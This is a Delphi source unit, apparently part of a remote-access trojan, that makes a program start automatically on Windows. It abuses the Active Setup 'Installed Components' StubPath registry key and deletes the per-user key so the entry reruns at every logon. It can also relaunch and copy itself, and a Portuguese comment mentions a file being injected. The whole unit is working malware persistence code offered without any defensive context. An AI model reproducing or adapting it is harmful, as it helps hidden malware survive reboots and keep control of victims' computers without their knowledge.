{*******************************************************}
{                                                       }
{       ActiveX startup unit                            }
{       December 2006, Codius                           }
{                                                       }
{*******************************************************}
unit unitStartup;

interface

uses
  Windows,
  UnitDiversos;

type
  TCAutostart = class
  private

  public
    constructor Create;
    destructor Destroy;
    procedure Install(lpKeyName, lpFilePath: pChar);
    procedure Uninstall(lpKeyName: pChar);
    procedure Update(lpKeyName: pChar);
    procedure Restart(lpFilePath, lpParameters: pChar);
    procedure Startup(lpKeyName, lpFilePath, lpParameters: pChar);
    function Move(lpFilePath: pChar): Boolean;
  end;

implementation

{ TCAutostart.Create
  This constructor will initialize the function variables. }
constructor TCAutostart.Create;
begin
  Inherited;
end;

{ TCAutostart.Destroy
  This destructor will free the library we used. }
destructor TCAutostart.Destroy;
begin
  Inherited;
end;

{ TCAutostart.Install
  This Procedure will create the keys and values needed to autostart. }
Procedure TCAutostart.Install(lpKeyName, lpFilePath: pChar);
const
  Param: string = ' Restart' + #0;
var
  Handle: HKEY;
begin
  RegCreateKeyEx(HKEY_LOCAL_MACHINE, pchar('Software\Microsoft\Active Setup\Installed Components\' + lpKeyName), 0, nil, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nil, Handle, nil);
  RegSetValueEx(Handle, 'StubPath', 0, 1, Pointer(pChar(lpFilePath + Param)), (Length(lpFilePath) + Length(Param)));
  RegCloseKey(Handle);
end;

{ TCAutostart.Uninstall
  This Procedure will remove all keys and values which were created during the install. }
procedure TCAutostart.Uninstall(lpKeyName: pChar);
var
  Handle: hkey;
begin
  RegOpenKeyEx(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Active Setup\Installed Components\', 0, KEY_WRITE, Handle);
  RegDeleteKey(Handle, lpKeyName);
  RegCloseKey(Handle);
  Update(lpKeyName);
end;

{ TCAutostart.Update
  This Procedure will remove the keys and values preventing the program to start at next reboot. }
procedure TCAutostart.Update(lpKeyName: pChar);
var
  Handle: hkey;
begin
  RegOpenKeyEx(HKEY_CURRENT_USER, 'Software\Microsoft\Active Setup\Installed Components\', 0, KEY_WRITE, Handle);
  RegDeleteKey(Handle, lpKeyName);
  RegCloseKey(Handle);
end;

{ TCAutostart.Restart
  This Procedure will start the actual program without the Restart parameter. }
procedure TCAutostart.Restart(lpFilePath, lpParameters: pChar);
begin
  if (ParamStr(1) = 'Restart') then
  begin
    MyShellExecute(0, nil, lpFilePath, lpParameters, nil, 5);
    Destroy;
    ExitProcess(0);
  end;
end;

{ TCAutostart.Startup
  This Procedure will install the autostart keys and values and keep them alive. }
procedure TCAutostart.Startup(lpKeyName, lpFilePath, lpParameters: pChar);
begin
  Update(lpKeyName);
  Restart(lpFilePath, lpParameters);
  //if Move(lpFilePath) then   // aqui eu retirei pois estava copiando o arquivo que eu injetava
  Install(lpKeyName, lpFilePath);
end;

{ TCAutostart.Move
  This Procedure will move the source file. }
function TCAutostart.Move(lpFilePath: pChar): Boolean;
begin
  Result := False;
  if (ParamStr(0) <> lpFilePath) then
  begin
    CopyFile(pChar(ParamStr(0)), lpFilePath, False);
    Result := True;
  end;
end;

end.